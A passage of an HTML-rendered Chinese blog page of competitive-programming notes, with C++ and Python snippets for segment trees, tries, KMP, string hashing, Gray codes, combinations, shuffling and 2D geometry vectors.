tree[lnode].v += tree[cur].lz * (mid - lv + <span class="hljs-number">1</span>);  <br>    tree[rnode].lz += tree[cur].lz;<br>    tree[rnode].v += tree[cur].lz * (rv - mid);<br>    tree[cur].lz = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 区间更新，同时用于初始化。</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update</span><span class="hljs-params">(ll cur, ll lv, ll rv, ll l, ll r, ll v)</span> </span>&#123;<br>    <span class="hljs-built_in">create</span>(cur);<br>    <span class="hljs-comment">// 当前节点被包含，打标记而不更新子节点。</span><br>    <span class="hljs-keyword">if</span> (l &lt;= lv &amp;&amp; rv &lt;= r) &#123;<br>        tree[cur].v += v * (rv - lv + <span class="hljs-number">1</span>);<br>        tree[cur].lz += v;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 未被包含，则只需要部分节点，因此要push_down与push_up左/右侧节点</span><br>    <span class="hljs-built_in">push_down</span>(cur, lv, rv);<br>    <span class="hljs-type">int</span> mid = (lv + rv) / <span class="hljs-number">2</span>, lnode = tree[cur].l, rnode = tree[cur].r;<br>    <br>    <span class="hljs-comment">// 只剩下两侧的节点，一定有lv &lt;= l 以及 rv &gt;= r, 因此分别只需要l、r在区间之内就好。</span><br>    <span class="hljs-comment">// 注意区间有交集的判定，基于限制条件才好判断，否则需要考虑一前一后两种相交和包含三种情况。 </span><br>    <span class="hljs-keyword">if</span> (l &lt;= mid)<br>        <span class="hljs-built_in">update</span>(lnode, lv, mid, l, r, v);<br>    <span class="hljs-keyword">if</span> (r &gt;= mid + <span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">update</span>(rnode, mid + <span class="hljs-number">1</span>, rv, l, r, v);<br>    <br>    <span class="hljs-comment">// 此时值已经更新，可以push_up</span><br>    <span class="hljs-built_in">push_up</span>(cur);<br>&#125;<br><br><span class="hljs-comment">// 获取区间值</span><br><span class="hljs-function">ll <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-type">int</span> cur, <span class="hljs-type">int</span> lv, <span class="hljs-type">int</span> rv, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> </span>&#123;<br>    <span class="hljs-comment">// 查询与更新类似，需要的时候更新节点</span><br>    <span class="hljs-built_in">create</span>(cur);<br>    <span class="hljs-keyword">if</span> (l &lt;= lv &amp;&amp; rv &lt;= r) &#123;<br>        <span class="hljs-keyword">return</span> tree[cur].v;<br>    &#125;<br>    <span class="hljs-comment">// 这一步确保子节点的值没有问题</span><br>    <span class="hljs-built_in">push_down</span>(cur, lv, rv);<br>    <span class="hljs-type">int</span> mid = (lv + rv) / <span class="hljs-number">2</span>, lnode = tree[cur].l, rnode = tree[cur].r;<br>    ll ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 同理，两侧需要查询</span><br>    <span class="hljs-keyword">if</span> (l &lt;= mid) &#123;<br>        ans += <span class="hljs-built_in">query</span>(lnode, lv, mid, l, r);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (r &gt;= mid + <span class="hljs-number">1</span>) &#123;<br>        ans += <span class="hljs-built_in">query</span>(rnode, mid + <span class="hljs-number">1</span>, rv, l, r);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><span class="hljs-comment">// 示例</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">10</span>;<br>    <span class="hljs-comment">// 初始化</span><br>    cnt = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span> * n; i++) &#123;<br>        tree[i].is_c = <span class="hljs-number">0</span>, tree[i].lz = <span class="hljs-number">0</span>, tree[i].v = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// 区间更新</span><br>    <span class="hljs-built_in">update</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">update</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 区间查询</span><br>    cout &lt;&lt; <span class="hljs-built_in">query</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>) &lt;&lt; endl;<br>    <span class="hljs-comment">// for (int i = 0; i &lt; n; i++) </span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="指针">指针</h2><h3 id="滑动">滑动</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 滑动</span><br><span class="hljs-keyword">while</span> (i &lt;= j, j &lt; n) &#123;<br>    <span class="hljs-keyword">if</span> (a &gt; tar) &#123;<br>        ans = <span class="hljs-built_in">max</span>(ans, val);<br>        j++;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        i++;<br>        <span class="hljs-comment">// 补集，不需要更新</span><br>        ans = <span class="hljs-built_in">max</span>(ans, val); <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表数组">链表数组</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 创建链表，或用map</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN=<span class="hljs-number">100010</span>;<br><span class="hljs-type">int</span> bg,n,k;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span> &#123;<br><span class="hljs-type">int</span> id,data,next;<br>&#125; Node[MAXN];<br><br>vector&lt;node&gt; ans;<br><br><span class="hljs-keyword">while</span>(cpy != <span class="hljs-number">-1</span>) &#123;<br>    ans.<span class="hljs-built_in">push_back</span>(Node[cpy]);<br>    cpy = Node[cpy].next;<br>&#125; <br></code></pre></td></tr></table></figure><h2 id="string">String</h2><h3 id="trie">Trie</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 可删除</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TrieNode</span> &#123;<br>    string word;<br>    unordered_map&lt;<span class="hljs-type">char</span>, TrieNode *&gt; children;<br>    <span class="hljs-built_in">TrieNode</span>() &#123;<br>        <span class="hljs-keyword">this</span>-&gt;word = <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;   <br>&#125;;<br><br><span class="hljs-comment">// 同时判断isend</span><br><span class="hljs-keyword">if</span> (nxt-&gt;word.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">0</span>) &#123;<br>    res.<span class="hljs-built_in">insert</span>(nxt-&gt;word);<br>    nxt-&gt;word = <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// 遍历结束删除</span><br><span class="hljs-keyword">if</span> (nxt-&gt;children.<span class="hljs-built_in">empty</span>()) &#123;<br>    root-&gt;children.<span class="hljs-built_in">erase</span>(ch);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="kmp">KMP</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 相反方向需要map</span><br><span class="hljs-comment">// 动态规划 - 前缀</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">nxt</span><span class="hljs-params">(m)</span></span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>, j = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>    <span class="hljs-keyword">while</span>(j &gt; <span class="hljs-number">0</span> &amp;&amp; part[j] != part[i]) j = nxt[j - <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">if</span> (part[j] == part[i]) nxt[i] = ++j;<br>&#125;<br><br><span class="hljs-comment">// kmp匹配</span><br><span class="hljs-keyword">while</span>(l &lt; n) &#123;<br>    <span class="hljs-keyword">if</span> (ns[l] == s[r]) &#123;<br>        l++;<br>        r++;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        res += r;<br>        <span class="hljs-keyword">while</span>(r &gt; <span class="hljs-number">0</span> &amp;&amp; ns[l] != s[r]) &#123;<br>            r = pre[r - <span class="hljs-number">1</span>];<br>            res += r;<br>        &#125; <br>        <span class="hljs-keyword">if</span> (r == <span class="hljs-number">0</span> &amp;&amp; ns[l] != s[r]) l++;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (r == n) &#123;<br>        <span class="hljs-comment">//...</span><br>        r = pre[r];<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="string_hash">string_hash</h3><p><a href="#hash">hash</a></p><p>字母的hash (long long ) int(1e9 + 7) prime base = 31<br />l-1044 longest duplicate substring</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 滑动哈希 长度为定值</span><br><span class="hljs-type">long</span> <span class="hljs-type">long</span> mult = <span class="hljs-built_in">qPow</span>(base, len - <span class="hljs-number">1</span>);<br>ha = ((ha - A[i - len] * mult % mod + mod) % mod * base + A[i]);<br><br><span class="hljs-comment">// 前缀哈希 提取一段距离 可以选择两组哈希防止冲突、</span><br><span class="hljs-comment">// 常用base 37 171 MOD 1e9 + 7</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">long</span> <span class="hljs-type">long</span>&gt; <span class="hljs-title">f</span><span class="hljs-params">(n + <span class="hljs-number">1</span>)</span>, <span class="hljs-title">P</span><span class="hljs-params">(n + <span class="hljs-number">1</span>)</span></span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) f[i] = (f[i - <span class="hljs-number">1</span>] * <span class="hljs-number">171</span> + s[i - <span class="hljs-number">1</span>]) % MOD;<br>P[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) P[i] = P[i - <span class="hljs-number">1</span>] * <span class="hljs-number">171</span> % MOD;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> h = (f[i + mid - <span class="hljs-number">1</span>] - f[i - <span class="hljs-number">1</span>] * P[mid] % MOD + MOD) % MOD;<br><br></code></pre></td></tr></table></figure><h2 id="prob">Prob+</h2><h3 id="entropy">entropy</h3><p><a href="../view/prob.md#entropy">entropy</a> - as information(信息量) ！可能的输出 - 匹配可能的结果</p><p><a href="https://www.av8n.com/physics/twelve-coins.htm">TheTwelve-Coins Puzzles</a></p><ol type="1"><li><p>calc the entropy(information) &lt;= 实验的信息</p></li><li><p>确保每一步实验后的信息量仍然满足上述条件，注意分堆后，保留上次称重的信息，只要选中一个砝码，就知道是更重的/更轻的，即使还没有选中，但此时只需要选出砝码的信息量即可。</p></li><li><p>transmit to a code -&gt; the result table RRR RRB ...</p></li><li><p>矛盾条件 若一个corn为RRB, 那么若他较轻，则会出现LLB的情况</p><p>even though it appears we have 27 codewords, this approach has nochance of handling more than 13 coins.</p><p>一一对应每一个硬币 - 假设实验为定值</p></li></ol><p><img src="/images/information-1.png" alt="image-20220326205757610" style="zoom:50%;" /></p><p><a href="https://coady.github.io/posts/coin-balance/">twelve coincode</a></p><h3 id="编码">编码</h3><p>generate add 0 / add 1<br />map(instead of recursive)<br />l-1238 circulate from start<br />$ i xor (i &gt;&gt; 1)xor start$</p><ol type="1"><li><p>if a ^ b = c ^ b a == b</p></li><li><p>a,b at most one bit different, res is still gray code</p></li><li><p>num to grey - gray to num</p></li></ol><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># num to gray </span><br>i ^ (i &gt;&gt; <span class="hljs-number">1</span>)  <br><span class="hljs-comment"># gray to num 与n的每一位亦或 </span><br>res = n<br><span class="hljs-keyword">while</span> n &gt; <span class="hljs-number">0</span>:  <br>n &gt;&gt; = <span class="hljs-number">1</span> <br>    res ^= n<br><span class="hljs-comment"># num to gray</span><br></code></pre></td></tr></table></figure></p><h3 id="组合-1">组合</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// ncr = (n - 1)Cr + (n - c)C(r - 1)</span><br><span class="hljs-comment">// 未选取特定元素的组合 - 选取了特定元素的组合</span><br><span class="hljs-comment">// ncr</span><br><span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">C</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> r)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(r &gt; n - r) r = n - r; <span class="hljs-comment">// because C(n, r) == C(n, n - r)</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> ans = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">1</span>; i &lt;= r; i++) &#123;<br>        ans *= n - r + i;<br>        ans /= i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX 100 <span class="hljs-comment">// assuming we need first 100 rows</span></span><br><span class="hljs-type">long</span> <span class="hljs-type">long</span> triangle[MAX + <span class="hljs-number">1</span>][MAX + <span class="hljs-number">1</span>];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">makeTriangle</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> i, j;<br><br>    <span class="hljs-comment">// initialize the first row</span><br>    triangle[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>; <span class="hljs-comment">// C(0, 0) = 1</span><br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">1</span>; i &lt; MAX; i++) &#123;<br>        triangle[i][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>; <span class="hljs-comment">// C(i, 0) = 1</span><br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">1</span>; j &lt;= i; j++) &#123;<br>            triangle[i][j] = triangle[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + triangle[i - <span class="hljs-number">1</span>][j];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">C</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> r)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> triangle[n][r];<br>&#125;<br></code></pre></td></tr></table></figure><p>l-491 increasing subsequences<br />check duplicate same value<br />the former is selected and the latter is not x<br />or with hash code</p><p>** l-458 poor pigs<br />combination C(i, j) = C(i - 1, j) + C(i - 1, j - 1);(add new i)</p><h3 id="random">random</h3><p>l-384 shuffle an array<br />fishier-yates shuffle<br />i(0 - n) j = i + rand()%(len - i) swap(i, j)<br />each position<br />P(not selceted) % P(selceted by jth)<br />correctness proof<br />has n! conditions(through condition probability)<br /><span class="math display">\[P(x&#39;(i) = b_i \quad \text{for 1 $\le$ i $\le$ n}) = \frac{1}{n!}\]</span> motekalo<br />count times in each pos</p><h2 id="几何">几何</h2><h3 id="k值">K值</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 多次分类</span><br><span class="hljs-comment">// 归一化 + 第一个复数为0 ...</span><br>ll d1 = x1 - x2, d2 = y1 - y2;<br>ll sign = (d1 &gt;= <span class="hljs-number">0</span>) ^ (d2 &gt;= <span class="hljs-number">0</span>) ? <span class="hljs-number">-1</span> : <span class="hljs-number">1</span>;<br>ll fac = __gcd(<span class="hljs-built_in">abs</span>(d1), <span class="hljs-built_in">abs</span>(d2));<br>ll x = sign * <span class="hljs-built_in">abs</span>(d1)/fac, ll y = <span class="hljs-built_in">abs</span>(d2)/fac;<br><br><span class="hljs-keyword">if</span> (x == <span class="hljs-number">0</span>) &#123;<br>    y = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (y == <span class="hljs-number">0</span>) &#123;<br>    x = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (y &lt; <span class="hljs-number">0</span>) &#123;<br>        x = -x;<br>        y = -y;<br>    &#125;<br>    <span class="hljs-comment">// 提高精度</span><br>    <span class="hljs-type">int</span> gcdXY = <span class="hljs-built_in">gcd</span>(<span class="hljs-built_in">abs</span>(x), <span class="hljs-built_in">abs</span>(y));<br>    x /= gcdXY, y /= gcdXY;<br>&#125;<br><br><span class="hljs-comment">// 防止溢出</span><br>ll sign = (d1 ^ d2) &gt;= <span class="hljs-number">0</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">-1</span>;<br><span class="hljs-comment">// -1 0 1 0 同属于一种 ！0的正负性单独讨论</span><br>sign = (d1 == <span class="hljs-number">0</span> || d2 == <span class="hljs-number">0</span>) ? <span class="hljs-number">1</span> : sign;<br>ll fac = __gcd(<span class="hljs-built_in">abs</span>(d1), <span class="hljs-built_in">abs</span>(d2));<br>ll x = sign * <span class="hljs-built_in">abs</span>(d1)/fac, y = <span class="hljs-built_in">abs</span>(d2)/fac;<br><br><span class="hljs-comment">// k1 * b2 == k2 * b1 判断平行</span><br><span class="hljs-comment">// (x1 - x0)(y3 - y2) = (y1 - y0)(x3 - x2);</span><br><span class="hljs-comment">// ax + by + c = 0 -&gt; a1 * b2 = a2 * b1 c</span><br><span class="hljs-comment">// y - y1 = (y2 - y1)/(x2 - x1) * (x - x1)</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs c++">M_PI<br><span class="hljs-type">double</span> eps = <span class="hljs-number">1e-6</span>;<br><span class="hljs-comment">// 向量</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">V</span> &#123;<br>    <span class="hljs-type">double</span> x, y;<br>    <span class="hljs-built_in">V</span>() : <span class="hljs-built_in">x</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">y</span>(<span class="hljs-number">0</span>) &#123;&#125;<br>    <span class="hljs-built_in">V</span>(<span class="hljs-type">double</span> a, <span class="hljs-type">double</span> b) : <span class="hljs-built_in">x</span>(a), <span class="hljs-built_in">y</span>(b) &#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// 常见运算符</span><br><span class="hljs-keyword">inline</span> V <span class="hljs-keyword">operator</span> * (<span class="hljs-type">const</span> <span class="hljs-type">double</span> &amp;x,<span class="hljs-type">const</span> V &amp;a)&#123;<span class="hljs-keyword">return</span> (V)&#123;a.x*x,a.y*x&#125;;&#125;<br><span class="hljs-comment">// 点积、叉积 |a|*|b| cos / sin(可代表面积)</span><br><span class="hljs-keyword">inline</span> <span class="hljs-type">double</span> <span class="hljs-keyword">operator</span> * (<span class="hljs-type">const</span> V &amp;a,<span class="hljs-type">const</span> V &amp;b)&#123;<span class="hljs-keyword">return</span> a.x*b.x+a.y*b.y;&#125;<br><span class="hljs-keyword">inline</span> <span class="hljs-type">double</span> <span class="hljs-keyword">operator</span> ^ (<span class="hljs-type">const</span> V &amp;a,<span class="hljs-type">const</span> V &amp;b)&#123;<span class="hljs-keyword">return</span> a.x*b.y-a.y*b.x;&#125;<br><br><span class="hljs-comment">// 相等</span><br><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span> == (<span class="hljs-type">const</span> V &amp;a,<span class="hljs-type">const</span> V &amp;b)&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">abs</span>(a.x-b.x)&lt;eps&amp;&amp;<span class="hljs-built_in">abs</span>(a.y-b.y)&lt;eps;&#125;<br><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span> != (<span class="hljs-type">const</span> V &amp;a,<span class="hljs-type">const</span> V &amp;b)&#123;<span class="hljs-keyword">return</span> !(a==b);&#125;<br><br><span class="hljs-comment">// 长度</span><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">double</span> <span class="hljs-title">len</span><span class="hljs-params">(<span class="hljs-type">const</span> V &amp;a)</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">sqrt</span>(a.x*a.x+a.y*a.y);&#125;<br><br><span class="hljs-comment">// 角度</span><br><span class="hljs-comment">// 两向量与原点的夹角</span><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">double</span> <span class="hljs-title">angle</span><span class="hljs-params">(<span class="hljs-type">const</span> V &amp;a,<span class="hljs-type">const</span> V &amp;b)</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">acos</span>(a * b / <span class="hljs-built_in">len</span>(a) / <span class="hljs-built_in">len</span>(b)); &#125;<br><br><span class="hljs-comment">// 钝角</span><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">dun</span><span class="hljs-params">(<span class="hljs-type">const</span> V &amp;a,<span class="hljs-type">const</span> V &amp;b,<span class="hljs-type">const</span> V &amp;c)</span></span>&#123;<span class="hljs-keyword">return</span> ((b-a)*(c-a))&lt;-eps;&#125;<span class="hljs-comment">//angle:BAC</span><br><br><span class="hljs-comment">// atan2 直接得到向量与x轴的角度 -pi 到 pi</span><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">double</span> <span class="hljs-title">angle</span><span class="hljs-params">(<span class="hljs-type">double</span> x, <span class="hljs-type">double</span> y)</span> </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">atan2</span>(y, x);&#125;<br><br><span class="hljs-comment">// 旋转 t为旋转角度 (x + yi) × (cosθ + sinθi) 逆时针旋转</span><br><span class="hljs-function"><span class="hljs-keyword">inline</span> V <span class="hljs-title">rotate</span><span class="hljs-params">(<span class="hljs-type">const</span> V &amp;o, <span class="hljs-type">double</span> t)</span></span>&#123;<br>  <span class="hljs-type">double</span> s=<span class="hljs-built_in">sin</span>(t), c=<span class="hljs-built_in">cos</span>(t);<br>  <span class="hljs-keyword">return</span> (V)&#123;o.x*c - 